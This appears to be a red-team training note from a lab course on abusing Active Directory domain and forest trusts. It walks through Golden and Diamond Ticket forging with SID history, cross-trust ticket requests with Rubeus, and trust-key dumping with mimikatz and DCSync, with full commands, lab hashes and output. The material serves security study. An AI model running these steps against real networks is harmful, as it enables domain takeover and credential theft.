---
description: 10/02/2025
---

# ✅ Forest & Domain Trusts

## Introduction

At a basic level, a trust relationship enables users in one domain to authenticate and access resources in another domain.

This works by allowing authentication traffic to flow between them using referrals.

When a user requests access to a resource outside of their current domain, their KDC will return a referral ticket pointing the KDC of the target domain.

The user's TGT is encrypted using an inter-realm trust key (rather than the local `krbtgt`), which is often called an inter-realm TGT.

The foreign domain decrypts this ticket, recovers the user's TGT and decides whether they should be granted access to the resource or not.

### Trusts

**Trusts can be either:**

1. one-way or two-way
2. transitive or non-transitive

#### One-Way Trusts

Allows principals in the **trusted** domain to access resources in the **trusting** domain, but not vice versa.

#### Two-Way Trusts

The same thing as a one-way trust. Think of it as two one-way trusts that go in the opposite directions.

It allows users in each domain to access resources in the other.

Trust directions are confusing as the direction of the trust is the opposite of the direction of access.

<figure><img src="../.gitbook/assets/image (308).png" alt=""><figcaption></figcaption></figure>

### Example

If Domain A trusts Domain B, Domain A is the trusting domain and Domain B is the trusted domain.

This allows users in Domain B to access Domain A, but not Domain A to access Domain B.

### Side Note

One-way trusts can be labelled as **Inbound** or **Outbound** depending on your perspective.

In Domain A, this would be an **Outbound Trust**.&#x20;

In Domain B, this would be an **Inbound Trust**.

Transitivity defines whether or not a trust can be chained. For instance, if Domain A trusts Domain B, and Domain B trusts Domain C, then A also trusts C.

If these domains are owned by different entities, then there are obvious implications in terms of the trust model.

## Parent/Child

When a child domain is added to a forest, it automatically creates a transitive, two-way trust with its parent.

This can be found in the lab where `dev.cyberbotic.io` is a child domain of `cyberbotic.io`.

```
beacon> getuid
[*] You are DEV\bfarmer

beacon> powershell Get-DomainTrust

SourceName      : dev.cyberbotic.io
TargetName      : cyberbotic.io
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 8/15/2022 4:00:00 PM
WhenChanged     : 8/15/2022 4:00:00 PM
```

#### Explanation of Output

* `SourceName`: Current domain
* `TargetName`: Foreign domain
* `TrustDirection`: Is the trust direction (bidirectional is two-way)
* `TrustAttributes`: `WITHIN_FOREST` lets us know that both of these domains are part of the same forest which implies a parent/child relationship

If we have Domain Admin privileges in the child, we can also gain Domain Admin privileges in the parent using a TGT with a special attribute known as SID history.

SID history was designed to support migration scenarios, where a user would be moved from one domain to another.

To preserve access to resources within the "old" domain, the user's previous SID would be added to the SID history of their new account.

When creating such a ticket, the SID of a privileged group (EAs, DAs, etc) in the parent domain can be added that will grant access to all resources in the parent.

This can ultimately be achieved using either a Golden or Diamond Ticket.

### Golden Ticket

The process is the same as creating Golden Tickets described earlier.

**The only additional information required now is the SID of a target group in the parent domain:**

```
beacon> powershell Get-DomainGroup -Identity "Domain Admins" -Domain cyberbotic.io -Properties ObjectSid

objectsid                                   
---------                                   
S-1-5-21-2594061375-675613155-814674916-512

beacon> powershell Get-DomainController -Domain cyberbotic.io | select Name

Name              
----              
dc-1.cyberbotic.io
```

**After obtaining the SID of the target group in the parent domain, we can create the golden ticket with Rubeus:**

```
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /sids:S-1-5-21-2594061375-675613155-814674916-512 /nowrap

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : DEV.CYBERBOTIC.IO (DEV)
[*] SID            : S-1-5-21-569305411-121244042-2357301523
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ExtraSIDs      : S-1-5-21-2594061375-675613155-814674916-512
[*] ServiceKey     : 51D7F328ADE26E9F785FD7EEE191265EBC87C01A4790A7F38FB52E06563D4E7E
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : 51D7F328ADE26E9F785FD7EEE191265EBC87C01A4790A7F38FB52E06563D4E7E
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt
[*] Target         : dev.cyberbotic.io

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@dev.cyberbotic.io'

[*] AuthTime       : 9/12/2022 10:44:21 AM
[*] StartTime      : 9/12/2022 10:44:21 AM
[*] EndTime        : 9/12/2022 8:44:21 PM
[*] RenewTill      : 9/19/2022 10:44:21 AM

[*] base64(ticket.kirbi):

      doIFmD[...]MuaW8=
```

**Then, we can import it into a logon session for our Beacon and use it to access the Domain Controller in the parent:**

```
beacon> run klist

Current LogonId is 0:0x3a6665

Cached Tickets: (1)

#0>	Client: Administrator @ DEV.CYBERBOTIC.IO
	Server: krbtgt/dev.cyberbotic.io @ DEV.CYBERBOTIC.IO
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96

beacon> ls \\dc-1.cyberbotic.io\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/15/2022 15:26:54   $Recycle.Bin
          dir     08/10/2022 04:55:17   $WinREAgent
          dir     08/10/2022 05:05:53   Boot
          dir     08/18/2021 23:34:55   Documents and Settings
          dir     08/19/2021 06:24:49   EFI
          dir     05/08/2021 08:20:24   PerfLogs
          dir     08/24/2022 11:11:21   Program Files
          dir     08/10/2022 04:06:16   Program Files (x86)
          dir     09/08/2022 17:33:33   ProgramData
          dir     08/15/2022 15:07:48   Recovery
          dir     08/24/2022 11:05:32   Shares
          dir     08/31/2022 16:44:18   System Volume Information
          dir     08/15/2022 15:09:04   Users
          dir     08/24/2022 11:10:45   Windows
 427kb    fil     08/10/2022 05:00:07   bootmgr
 1b       fil     05/08/2021 08:14:33   BOOTNXT
 12kb     fil     09/12/2022 08:36:09   DumpStack.log.tmp
 384mb    fil     09/12/2022 08:36:09   pagefile.sys
```

### Diamond Ticket

**The Rubeus&#x20;**<mark style="color:yellow;">**`diamond`**</mark>**&#x20;command also has a&#x20;**<mark style="color:yellow;">**`/sids`**</mark>**&#x20;parameter, with which we can supply the extra SIDs we want in our ticket:**

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:519 /sids:S-1-5-21-2594061375-675613155-814674916-519 /krbkey:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap

[*] Action: Diamond Ticket

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/dc-2.dev.cyberbotic.io'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: KT+juea5lxCbxNfLLWbgRorvmR+gRkaoifHatrHE0GE=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIF1j[...]5JTw==

[*] Decrypting TGT
[*] Retreiving PAC
[*] Modifying PAC
[*] Signing PAC
[*] Encrypting Modified TGT

[*] base64(ticket.kirbi):

      doIGAj[...]lDLklP
```

### Going Through a few Different Scenarios

If `dev.cyberbotic.io` also had a child (e.g. `test.dev.cyberbotic.io`), then a DA in `TEST` would be able to use their `krbtgt` to hop on DA/EA in `cyberbotic.io` instantly because the trusts are transitive.

There are also other means which do not require Domain Admin in the child.

For example, you can kerberoast and/or ASREProast across domain trusts, which may lead to privileged credential disclosure.

Because principals in `CYBER` can be granted access to resources in `DEV`, you may find instances where they are accessing machines we have compromised.

If they interact with a machine with unconstrained delegation, we can capture their TGTs.

If they're on a machine interactively, such as RDP, we can impersonate them just like any other user.

## One-Way Inbound

**`dev.cyberbotic.io` also has a one-way inbound trust with `dev-studio.com`:**

```
beacon> powershell Get-DomainTrust

SourceName      : dev.cyberbotic.io
TargetName      : dev-studio.com
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : 
TrustDirection  : Inbound
WhenCreated     : 8/16/2022 9:52:37 AM
WhenChanged     : 8/16/2022 9:52:37 AM
```

Since the trust is inbound from our perspective, it means that principals in our domain can be granted access to resources in the foreign domain.

**We can enumerate the foreign domain across the trust:**

```
beacon> powershell Get-DomainComputer -Domain dev-studio.com -Properties DnsHostName

dnshostname      
-----------      
dc.dev-studio.com
```

<mark style="color:yellow;">`Get-DomainForeignGroupMember`</mark> will enumerate any groups that contain users outside of its domain and return its members.

```
beacon> powershell Get-DomainForeignGroupMember -Domain dev-studio.com

GroupDomain             : dev-studio.com
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=dev-studio,DC=com
MemberDomain            : dev-studio.com
MemberName              : S-1-5-21-569305411-121244042-2357301523-1120
MemberDistinguishedName : CN=S-1-5-21-569305411-121244042-2357301523-1120,CN=ForeignSecurityPrincipals,DC=dev-studio,DC=com
```

This output shows that there's a member of the domain's built-in Administrators group who is not part of `dev-studio.com`.

**The `MemberName` field contains a SID that can be resolved in our current domain:**

```
beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1120

DEV\Studio Admins
```

This means that members of `DEV\Studio Admins` are also members of the built-in Administrators group of `dev-studio.com` and therefore inherit local admin access to `dc.dev-studio.com`.

**If this is confusing, this is how it looks like from the perspective of the foreign Domain Controller:**

<figure><img src="../.gitbook/assets/image (309).png" alt=""><figcaption></figcaption></figure>

### "Hopping" in a Trust

**To hop into a trust, we only need to impersonate a member of this Studio Admins Domain Group:**

```
beacon> powershell Get-DomainGroupMember -Identity "Studio Admins" | select MemberName

MemberName
----------
nlamb
```

To hop a domain using Kerberos, we first need an inter-realm key.

**Obtain a TGT for the target user (here, I am using `asktgt` with their AES-256 hash):**

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /aes256:a779fa8afa28d66d155d9d7c14d394359c5d29a86b6417cb94269e2e84c4cee4 /nowrap

[*] Action: Ask TGT

[*] Using aes256_cts_hmac_sha1 hash: a779fa8afa28d66d155d9d7c14d394359c5d29a86b6417cb94269e2e84c4cee4
[*] Building AS-REQ (w/ preauth) for: 'dev.cyberbotic.io\nlamb'
[*] Using domain controller: 10.10.122.10:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

doIFwj[...]MuaW8=
```

**Next, we can use that TGT to request a referral ticket from the current domain in the target domain:**

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:krbtgt/dev-studio.com /domain:dev.cyberbotic.io /dc:dc-2.dev.cyberbotic.io /ticket:doIFwj[...]MuaW8= /nowrap

[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'krbtgt/dev-studio.com'
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
[+] TGS request successful!
[*] base64(ticket.kirbi):

doIFoz[...]NPTQ==

ServiceName              :  krbtgt/DEV-STUDIO.COM
ServiceRealm             :  DEV.CYBERBOTIC.IO
UserName                 :  nlamb
UserRealm                :  DEV.CYBERBOTIC.IO
StartTime                :  9/12/2022 11:13:23 AM
EndTime                  :  9/12/2022 9:11:21 PM
RenewTill                :  9/19/2022 11:11:21 AM
Flags                    :  name_canonicalize, pre_authent, renewable, forwardable
KeyType                  :  rc4_hmac
Base64(key)              :  zfUbwA2B0+aqao7HSvnUgw==
```

{% hint style="info" %}
Notice how this inter-realm ticket is of type <mark style="color:yellow;">`rc4_hmac`</mark> even though our TGT was <mark style="color:yellow;">`aes256_cts_hmac_sha1`</mark>. &#x20;

This is the default configuration unless AES has been specifically configured on the trust, so this is not necessarily bad OPSEC.
{% endhint %}

**Finally, use this inter-realm ticket to request TGS's in the target domain. Here, we are requesting a ticket for CIFS:**

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/dc.dev-studio.com /domain:dev-studio.com /dc:dc.dev-studio.com /ticket:doIFoz[...]NPTQ== /nowrap

[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'cifs/dc.dev-studio.com'
[*] Using domain controller: dc.dev-studio.com (10.10.150.10)
[+] TGS request successful!
[*] base64(ticket.kirbi):

doIFkD[...]8uY29t

ServiceName              :  cifs/dc.dev-studio.com
ServiceRealm             :  DEV-STUDIO.COM
UserName                 :  nlamb
UserRealm                :  DEV.CYBERBOTIC.IO
StartTime                :  9/12/2022 11:16:46 AM
EndTime                  :  9/12/2022 9:11:21 PM
RenewTill                :  9/19/2022 11:11:21 AM
Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
KeyType                  :  aes256_cts_hmac_sha1
Base64(key)              :  V1vCRoRX/9SAFe/ynWQIE9E9DYztP0mk6bg9BRx9Wjk=
```

**If desired, use `klist` to view our cached ticket(s):**

```
beacon> run klist

Current LogonId is 0:0x45bcb0

Cached Tickets: (1)

#0>	Client: nlamb @ DEV.CYBERBOTIC.IO
	Server: cifs/dc.dev-studio.com @ DEV-STUDIO.COM
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	
beacon> ls \\dc.dev-studio.com\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/16/2022 09:15:48   $Recycle.Bin
          dir     08/10/2022 04:55:17   $WinREAgent
          dir     08/10/2022 05:05:53   Boot
          dir     08/18/2021 23:34:55   Documents and Settings
          dir     08/19/2021 06:24:49   EFI
          dir     05/08/2021 08:20:24   PerfLogs
          dir     08/19/2021 06:35:15   Program Files
          dir     08/10/2022 04:06:16   Program Files (x86)
          dir     08/16/2022 09:26:24   ProgramData
          dir     08/16/2022 08:54:23   Recovery
          dir     08/16/2022 09:26:41   System Volume Information
          dir     08/16/2022 08:55:34   Users
          dir     08/16/2022 09:23:25   Windows
 427kb    fil     08/10/2022 05:00:07   bootmgr
 1b       fil     05/08/2021 08:14:33   BOOTNXT
 12kb     fil     09/12/2022 08:36:05   DumpStack.log.tmp
 384mb    fil     09/12/2022 08:36:05   pagefile.sys
```

## One-Way Outbound

Remember that if Domain A trusts Domain B, users in Domain B can access resources in Domain A; but users in Domain A should not be able to access resources in Domain B.

As a result, if we're in Domain A, we should not be able to access Domain B by design.

An outbound trust exists between `cyberbotic.io` and `msp.org`.

The direction of trust is such that `cyberbotic.io` trusts `msp.org` (so users of `msp.org` can access resources in `cyberbotic.io`).

{% hint style="info" %}
Because `DEV` has trust with `CYBER`, we can <mark style="color:yellow;">query the trusts</mark> that it has by adding the `-Domain` parameter.

**(See below):**
{% endhint %}

```
beacon> getuid
[*] You are DEV\bfarmer

beacon> powershell Get-DomainTrust -Domain cyberbotic.io

SourceName      : cyberbotic.io
TargetName      : msp.org
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FILTER_SIDS
TrustDirection  : Outbound
WhenCreated     : 8/16/2022 9:49:17 AM
WhenChanged     : 8/16/2022 9:49:17 AM
```

As a result, we can still partially exploit this trust and obtain "domain user" access from `CYBER` to `MSP` by leveraging the shared credential for the trust.

Both domains in a trust relationship will store a shared password (which gets changed every 30 days) in a Trusted Domain Object (TDO).

These objects are stored in the system container and can be read via LDAP.

**Here, we can see that the DC in&#x20;**<mark style="color:yellow;">**`CYBER`**</mark>**&#x20;has two TDOs for its trusts with&#x20;**<mark style="color:yellow;">**`DEV`**</mark>**&#x20;and&#x20;**<mark style="color:yellow;">**`MSP`**</mark>**:**

```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=trustedDomain)" --domain cyberbotic.io --attributes distinguishedName,name,flatName,trustDirection

[*] TOTAL NUMBER OF SEARCH RESULTS: 2
	[+] distinguishedName : CN=dev.cyberbotic.io,CN=System,DC=cyberbotic,DC=io
	[+] name              : dev.cyberbotic.io
	[+] flatName          : DEV
	[+] trustDirection    : 3

	[+] distinguishedName : CN=msp.org,CN=System,DC=cyberbotic,DC=io
	[+] name              : msp.org
	[+] flatName          : MSP
	[+] trustDirection    : 2
```

**There are&#x20;**<mark style="color:$success;">**two options for obtaining the key material**</mark>**:**

1. **Move laterally to the DC and dump from memory:**

```
beacon> run hostname
dc-1

beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> mimikatz lsadump::trust /patch

Domain: MSP.ORG (MSP / S-1-5-21-616357355-3455548143-339820157)
 [  In ] CYBERBOTIC.IO -> MSP.ORG

 [ Out ] MSP.ORG -> CYBERBOTIC.IO
    * 8/16/2022 9:49:17 AM - CLEAR   - 93 8e aa 1f 5f 6e 2a cc 51 7d d4 a8 07 f2 f0 2c a3 e0 20 3b 24 32 68 58 0d f8 ad cc
	* aes256_hmac       5db44be4317433d5ab1d3dea5925126d295d3e21c9682bca7fef76bc5a878f30
	* aes128_hmac       9851d2d80411e6d40122005d1c361579
	* rc4_hmac_nt       f3fc2312d9d1f80b78e67d55d41ad496

 [ In-1] CYBERBOTIC.IO -> MSP.ORG

 [Out-1] MSP.ORG -> CYBERBOTIC.IO
    * 8/16/2022 9:49:17 AM - CLEAR   - 93 8e aa 1f 5f 6e 2a cc 51 7d d4 a8 07 f2 f0 2c a3 e0 20 3b 24 32 68 58 0d f8 ad cc
	* aes256_hmac       5db44be4317433d5ab1d3dea5925126d295d3e21c9682bca7fef76bc5a878f30
	* aes128_hmac       9851d2d80411e6d40122005d1c361579
	* rc4_hmac_nt       f3fc2312d9d1f80b78e67d55d41ad496
```

{% hint style="danger" %}
**KEEP IN MIND:**&#x20;

This performs memory patching, which is very risky, particularly on a domain controller.
{% endhint %}

2. <mark style="color:yellow;">**`DCSync`**</mark>**&#x20;with the TDO's GUID:**

```
beacon> powershell Get-DomainObject -Identity "CN=msp.org,CN=System,DC=cyberbotic,DC=io" | select objectGuid

objectguid                          
----------                          
b93d2e36-48df-46bf-89d5-2fc22c139b43
```

```
beacon> mimikatz @lsadump::dcsync /domain:cyberbotic.io /guid:{b93d2e36-48df-46bf-89d5-2fc22c139b43}

[DC] 'cyberbotic.io' will be the domain
[DC] 'dc-1.cyberbotic.io' will be the DC server
[DC] Object with GUID '{b93d2e36-48df-46bf-89d5-2fc22c139b43}'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : msp.org

** TRUSTED DOMAIN - Antisocial **

Partner              : msp.org
 [ Out ] MSP.ORG -> CYBERBOTIC.IO
    * 8/16/2022 9:49:17 AM - CLEAR   - 93 8e aa 1f 5f 6e 2a cc 51 7d d4 a8 07 f2 f0 2c a3 e0 20 3b 24 32 68 58 0d f8 ad cc
	* aes256_hmac       5db44be4317433d5ab1d3dea5925126d295d3e21c9682bca7fef76bc5a878f30
	* aes128_hmac       9851d2d80411e6d40122005d1c361579
	* rc4_hmac_nt       f3fc2312d9d1f80b78e67d55d41ad496

 [Out-1] MSP.ORG -> CYBERBOTIC.IO
    * 8/16/2022 9:49:17 AM - CLEAR   - 93 8e aa 1f 5f 6e 2a cc 51 7d d4 a8 07 f2 f0 2c a3 e0 20 3b 24 32 68 58 0d f8 ad cc
	* aes256_hmac       5db44be4317433d5ab1d3dea5925126d295d3e21c9682bca7fef76bc5a878f30
	* aes128_hmac       9851d2d80411e6d40122005d1c361579
	* rc4_hmac_nt       f3fc2312d9d1f80b78e67d55d41ad496
```

#### Output

<mark style="color:yellow;">`[Out]`</mark> and <mark style="color:yellow;">`[Out-1]`</mark> are the "new" and "old" passwords respectively.&#x20;

* They're the same because 30 days has not elapsed since the creation of the trust.

In most cases, <mark style="color:green;">the current</mark> <mark style="color:yellow;">`[Out]`</mark> <mark style="color:green;">key is the one that you want</mark>.

Also, there is a "trust account" which is created in the "trusted" domain, with the name of the "trusting" domain.

**For instance, if we get all the user accounts in the `DEV` domain, we will see `CYBER$` and `STUDIO$`, which are the trust accounts for those respective domain trusts:**

```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=user)"

[*] TOTAL NUMBER OF SEARCH RESULTS: 11

        [...]
	[+] cn : CYBER$
	[+] cn : STUDIO$
```

This means that the `MSP` domain will have a trust account called `CYBER$`, even though we can't enumerate across the trust to confirm it.

**This is the account we must impersonate to request Kerberos tickets across the trust:**

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:CYBER$ /domain:msp.org /rc4:f3fc2312d9d1f80b78e67d55d41ad496 /nowrap

[*] Action: Ask TGT

[*] Using rc4_hmac hash: f3fc2312d9d1f80b78e67d55d41ad496
[*] Building AS-REQ (w/ preauth) for: 'msp.org\CYBER$'
[*] Using domain controller: 10.10.151.10:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFGD[...]Aub3Jn

  ServiceName              :  krbtgt/msp.org
  ServiceRealm             :  MSP.ORG
  UserName                 :  CYBER$
  UserRealm                :  MSP.ORG
  StartTime                :  9/12/2022 2:03:12 PM
  EndTime                  :  9/13/2022 12:03:12 AM
  RenewTill                :  9/19/2022 2:03:12 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  Uf2X2f65qJYeHow3kfHG2w==
  ASREP (key)              :  F3FC2312D9D1F80B78E67D55D41AD496
```

{% hint style="info" %}
Remember that RC4 tickets are used by default across trusts.
{% endhint %}

**This TGT can now be used to interact with the domain:**

```
beacon> run klist

Current LogonId is 0:0x537833

Cached Tickets: (1)

#0>	Client: CYBER$ @ MSP.ORG
	Server: krbtgt/msp.org @ MSP.ORG
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96

beacon> powershell Get-Domain -Domain msp.org

Forest                  : msp.org
DomainControllers       : {ad.msp.org}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : 
PdcRoleOwner            : ad.msp.org
RidRoleOwner            : ad.msp.org
InfrastructureRoleOwner : ad.msp.org
Name                    : msp.org
```

This account is obviously not a domain admin, but there are multiple abuse primitives that can be performed across the trust to elevate privileges — including Kerberoasting, ASREPRoasting, RBCD, and vulnerable certificate templates.

{% hint style="info" %}
As a challenge, find a way to get DA in this forest using one of those methods!
{% endhint %}
